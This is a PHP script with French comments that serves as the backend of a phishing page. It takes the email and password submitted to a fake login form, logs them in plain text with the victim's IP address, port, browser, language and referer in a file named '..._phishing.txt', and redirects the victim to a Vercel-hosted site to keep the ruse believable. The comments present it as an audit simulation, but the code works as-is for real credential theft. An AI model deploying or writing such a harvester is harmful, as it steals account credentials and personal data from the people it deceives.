<?php
// On vérifie que les données ont bien été envoyées en POST
if ($_SERVER["REQUEST_METHOD"] == "POST") {
    // 1. Récupération des identifiants du formulaire
    $email = isset($_POST['email']) ? $_POST['email'] : 'Non_renseigne';
    $password = isset($_POST['password']) ? $_POST['password'] : 'Non renseigné';
    
    // 2. Récupération des informations de la victime (Headers HTTP)
    $date = date('Y-m-d H:i:s');
    
    // Formatage de la date spécifique pour le nom du fichier (Ex: 2026-11-10_07h55)
    $date_for_filename = date('Y-m-d_H\hi\ms\s');
    
    // Nettoyage sommaire de l'email pour éviter les caractères interdits dans un nom de fichier
    $email_clean = str_replace(array('@', '.'), array('_at_', '_'), $email);

    // Détection de l'adresse IP (prend en compte l'utilisation de proxys/tunnels comme Ngrok)
    if (!empty($_SERVER['HTTP_X_FORWARDED_FOR'])) {
        $ip = $_SERVER['HTTP_X_FORWARDED_FOR'];
    } elseif (!empty($_SERVER['HTTP_CLIENT_IP'])) {
        $ip = $_SERVER['HTTP_CLIENT_IP'];
    } else {
        $ip = $_SERVER['REMOTE_ADDR'];
    }

    // Récupération des données réseau et système supplémentaires
    $port_source = isset($_SERVER['REMOTE_PORT']) ? $_SERVER['REMOTE_PORT'] : 'Inconnu';
    $user_agent = isset($_SERVER['HTTP_USER_AGENT']) ? $_SERVER['HTTP_USER_AGENT'] : 'Inconnu';
    $language = isset($_SERVER['HTTP_ACCEPT_LANGUAGE']) ? $_SERVER['HTTP_ACCEPT_LANGUAGE'] : 'Inconnu';
    $referer = isset($_SERVER['HTTP_REFERER']) ? $_SERVER['HTTP_REFERER'] : 'Direct ou masqué';
    $protocol = isset($_SERVER['SERVER_PROTOCOL']) ? $_SERVER['SERVER_PROTOCOL'] : 'Inconnu';
    $conn_type = (!empty($_SERVER['HTTPS']) && $_SERVER['HTTPS'] !== 'off') ? 'HTTPS' : 'HTTP';

    // 3. Formatage propre et lisible pour le contenu du rapport d'audit
    $log_entry = "==================================================\n";
    $log_entry .= "[+] RAPPORT D'AUDIT - SIMULATION COMPROMISSION    \n";
    $log_entry .= "==================================================\n";
    $log_entry .= "[-] Date/Heure    : $date\n";
    $log_entry .= "[-] Cible         : $email\n";
    $log_entry .= "[-] Mot de passe  : $password\n";
    $log_entry .= "[-] Adresse IP    : $ip\n";
    $log_entry .= "[-] Port Source   : $port_source\n";
    $log_entry .= "[-] Canal/Sécurité: $protocol ($conn_type)\n";
    $log_entry .= "[-] Navigateur/OS : $user_agent\n";
    $log_entry .= "[-] Langue Cible  : $language\n";
    $log_entry .= "[-] Venu de       : $referer\n";
    $log_entry .= "==================================================\n\n";

    // 4. Génération dynamique du nom du fichier au format demandé
    $filename = $date_for_filename . "_" . $email_clean . "_phishing.txt";

    // Écriture dans le fichier local unique
    file_put_contents($filename, $log_entry, FILE_APPEND);

    // 5. Redirection finale pour clore le scénario de manière crédible
    header("Location: https://web-frontend-b0gnhkkg0-clubinfoepo-3331.vercel.app");
    exit();
}
?>
